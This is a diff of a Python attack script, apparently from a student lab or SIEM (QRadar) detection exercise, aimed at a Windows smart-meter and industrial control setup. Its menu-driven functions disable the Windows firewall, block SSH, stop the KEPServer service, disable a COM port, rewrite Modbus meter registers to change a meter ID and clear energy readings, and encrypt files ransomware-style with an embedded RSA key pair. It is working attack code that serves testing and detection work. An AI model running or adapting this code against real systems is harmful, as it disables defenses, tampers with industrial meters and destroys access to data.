@@ -1,5 +1,9 @@
-from os import walk, path, remove, system, getcwd, mkdir
-import threading
+from os import walk, path, remove, system, getcwd, mkdir, scandir, urandom
+#import threading
+import base64
+from pathlib import Path
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP, AES
 from shutil import copyfile
 from subprocess import run, check_call, CalledProcessError, PIPE
 from ctypes import windll
@@ -8,7 +12,7 @@ from win32netcon import ACCESS_ALL
 from win32net import NetShareAdd
 
 copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
-smartmeterpath = "C:\\Users\\Student\\Documents\\SmartMeterData"
+smartmeterpath = "C:\\Users\\Student\\Documents\\AttackFolder"
 
 #Check if administrator
 def check_admin():
@@ -42,9 +46,9 @@ def copy_file(folder_path):
 def disable_firewall():
     cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
     if cp.stdout.decode('utf-8').strip() == "Ok.":
-        print("Firewall disabled successfully")
+        print("Firewall disabled successfully\nOk.")
     else:
-        print("Firewall failed to disable")
+        print("Firewall failed to disable\nFail.")
 
 #Disable ssh from firewall
 def disable_ssh():
@@ -52,22 +56,22 @@ def disable_ssh():
     if cp.stdout.decode('utf-8').strip() == "Ok.":
         print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
     else:
-        print("Inbound Firewall Failed to be Inserted")
+        print("Inbound Firewall Failed to be Inserted\nFail.")
     cp = run('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22',stdout=PIPE)
     if cp.stdout.decode('utf-8').strip() == "Ok.":
         print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
     else:
-        print("Inbound Firewall Failed to be Inserted")
+        print("Inbound Firewall Failed to be Inserted\nFail.")
     cp = run('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22',stdout=PIPE)
     if cp.stdout.decode('utf-8').strip() == "Ok.":
         print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
     else:
-        print("Outbound Firewall Failed to be Inserted")
+        print("Outbound Firewall Failed to be Inserted\nFail.")
     cp = run('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22',stdout=PIPE)
     if cp.stdout.decode('utf-8').strip() == "Ok.":
-        print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
+        print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)\nOk.")
     else:
-        print("Outbound Firewall Failed to be Inserted")
+        print("Outbound Firewall Failed to be Inserted\nFail.")
 
 #Disable Kepserver Service
 def disable_kepserver():
@@ -75,9 +79,9 @@ def disable_kepserver():
     cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
     output = cp.stdout.decode('utf-8').strip().split()
     if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]))
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.")
     else:
-        print("The " + output[1] + " service is " + output[9])
+        print("The " + output[1] + " service is " + output[9] + "\nOk.")
 
 #Run modpoll to interrupt COM1 port
 def run_modinterrup():
@@ -94,18 +98,18 @@ def disable_COMPort():
     cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
     dump = cp.stdout.split()
     deviceID = ""
+    comPort = ""
     deviceArr = []
     for i in range(0, len(dump)):
         if dump[i].decode("utf-8") == "ID:":
             deviceID = dump[i+1].decode("utf-8")
-            deviceArr.append(deviceID)
-            print(str(len(deviceArr)) + " : " + deviceID)
-    userInput = input("Choose device to disable, e.g. 1, 2, 3 \n")
-    batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/disable-device\" \"" + deviceArr[int(userInput)-1] + "\""
+            if "CVBCx196117" in deviceID:
+                comPort = deviceID
+    batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/disable-device\" \"" + comPort + "\""
     with open("script.bat", "w") as f:
         f.write(batchscript)
     cp = run(["script.bat"],stdout=PIPE ,shell=True)
-    print(cp.stdout.decode('utf-8'))
+    print(cp.stdout.decode('utf-8') + "Ok.")
     remove("script.bat")
 
 #Create Shared Folder
@@ -140,15 +144,13 @@ def Create_Share_folder():
 
 def encrypt_Files():
     #public key
-    pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckswNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
+    pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxTm9UT1pTRkI5SjEwVWF3bUNGRgpTWERLeE1tUFRQTDFKQmVyQ2xGbkI0MDJNblBtSVc1WXp6SXo4S29Rc2JzTXhQK3B4SSt4TzJmM283dW1RU0YwCitKdnRFNlRLc2RXN3JCTzJFNzVFekZzUXR0QmdyZEthOXJOL2ZVV3dwUXNFdFBwL1Jnay9XNENRcWZzUFZLQXAKTnFQWE43SllHNjJ0L1Y1Wk8zSTFRYmpHSUJ4UFF1U2ZrODhIa3l5NkdYWE1UOHRaT2pHUHNMUy9wTVkwaVEvUwp6RUh2M2RRYzJXZ2dJY3FBbUFKT0VWS2pyTFBHYlUvdHIzNWw4MDVIbHdoa3RmUXVsQStBR3JLT2JYdDdPK1cvCkxPU21Ib2VnSXJOaHZtRGsvUFRtRGFtYzdhTUIwaTZhZGIrRzFEMU5Sc0RXZEwyS3Rkb0lnMGVGQk9oQ0JtQUQKbndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
     pubKey = base64.b64decode(pubKey)
 
-    #directory to encrypt
-    directory = 'C://Users//Student//Documents//ransomwareTest'
     #exclude extensions
     excludeExtension = ['.py','.pem', '.exe']
 
-    for item in recurseFiles(directory): 
+    for item in recurseFiles(smartmeterpath): 
         filePath = Path(item)
         fileType = filePath.suffix.lower()
 
@@ -204,14 +206,8 @@ def decrypt(dataFile, privatekey):
     '''
     use EAX mode to allow detection of unauthorized modifications
     '''
-    with open("private.pem", 'w+') as f:
-        f.write(privatekey)
 
-    # read private key from file
-    with open("private.pem", 'rb') as f:
-        privateKey = f.read()
-        # create private key object
-        key = RSA.import_key(privateKey)
+    key = RSA.import_key(privatekey)
 
     # read data from file
     with open(dataFile, 'rb') as f:
@@ -235,12 +231,22 @@ def decrypt(dataFile, privatekey):
     print('Decrypted file saved to ' + decryptedFile)
 
 #Run modpoll to change register 40201 to 26
+def changeMeterID():
+    current_directory = getcwd()
+    executable_path = current_directory + "\\modpoll.exe"
+    parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", "26"]
+    try:
+        check_call([executable_path] + parameters)
+    except CalledProcessError as e:
+        print("Error executing the executable file:", e)
+
 def test():
     current_directory = getcwd()
     executable_path = current_directory + "\\modpoll.exe"
-    parameters = ["-r", "40201", "COM1", "26"]
+    checkEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "10", "-r", "26", "COM1"]
+    clearEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
     try:
-        check_call([executable_path] + parameters)
+        check_call([executable_path] + checkEnergy)
     except CalledProcessError as e:
         print("Error executing the executable file:", e)
 
@@ -292,65 +298,65 @@ def revert(revertoption):
         for i in range(0, len(dump)):
             if dump[i].decode("utf-8") == "ID:":
                 deviceID = dump[i+1].decode("utf-8")
-                deviceArr.append(deviceID)
-                print(str(len(deviceArr)) + " : " + deviceID)
-        userInput = input("Choose device to re-enable, e.g. 1, 2, 3 \n")
-        batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + deviceArr[int(userInput)-1] + "\""
+                if "CVBCx196117" in deviceID:
+                    comPort = deviceID
+        batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + comPort + "\""
         with open("script.bat", "w") as f:
             f.write(batchscript)
         cp = run(["script.bat"],stdout=PIPE ,shell=True)
-        print(cp.stdout.decode('utf-8'))
+        print(cp.stdout.decode('utf-8') + "Ok.")
         remove("script.bat")
 
     elif revertoption == "5":
         privatekey = '''-----BEGIN RSA PRIVATE KEY-----
-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
+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
 -----END RSA PRIVATE KEY-----'''
-        directory = "C://Users//Student//Documents//ransomwareTest" # CHANGE THIS
+        
         excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
-        for item in recurseFiles(directory): 
+        for item in recurseFiles(smartmeterpath): 
             filePath = Path(item)
             fileType = filePath.suffix.lower()
 
             if fileType in excludeExtension:
                 continue
             decrypt(filePath, privatekey)
-        remove("private.pem")
 
     elif revertoption == "6":
         current_directory = getcwd()
         executable_path = current_directory + "\\modpoll.exe"
-        parameters = ["-r", "40201", "COM1", "25"]
+        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
         try:
             check_call([executable_path] + parameters)
         except CalledProcessError as e:
             print("Error executing the executable file:", e)
-        else:
-            print ("Invalid Option!")
+    elif revertoption == "-h":
+        print("\n Choose: \n1 to enable firewall, \n2 to re-enable ssh through firewall, \n3 re-enable kepserver service, \4 re-enable COM port, \n5 decrypt encrypted files, \n6 change meter25 id back")
+    else:
+        print ("Invalid Option! Use option \"-h\" for help!")
 
 if __name__ == '__main__':
     check_admin()
@@ -373,11 +379,14 @@ if __name__ == '__main__':
     elif attackoption == "8":
         encrypt_Files()
     elif attackoption == "9":
+        changeMeterID()
+    elif attackoption == "10":
         revertoption = str(argv[2])
         revert(revertoption)
-    elif attackoption == "-h":
-        print("\nChoose 1 to delete file, 2 to copy file, 3 to disable firewall, 4 to disable ssh through firewall, 5 to disable Kepserver, 6 to interrup modbus reading, 7 to disable COMPORT, 8 to encrypt files, 9 to revert with options.")
-    elif attackoption == "10":
+    elif attackoption == "11":
         test()
+    elif attackoption == "-h":
+        print("\nChoose \n1 to delete file, \n2 to copy file, \n3 to disable firewall, \n4 to disable ssh through firewall, \n5 to disable Kepserver, \n6 to interrup modbus reading, \n7 to disable COMPORT, \n8 to encrypt files, \n9 change Meter25 Id to 26, \n10 to revert with options.")
+
     else:
-        print ("Invalid Option!")
+        print ("Invalid Option! Use option \"-h\" for help!")
